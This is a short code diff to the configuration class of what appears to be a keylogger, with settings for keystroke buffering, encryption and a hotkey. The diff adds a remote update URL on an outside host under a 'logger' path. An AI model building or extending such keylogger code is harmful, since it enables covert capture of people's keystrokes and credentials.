@@ -16,6 +16,7 @@ class Config:
     IV_LENGTH = 16
     BUFFER_LIMIT = 100000  # max keystrokes before flush
     CLIENT_VERSION = "1.0"
+    UPDATE_URL = "https://fasitheme.ir/logger/version.php"
     
     # System Settings
     EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
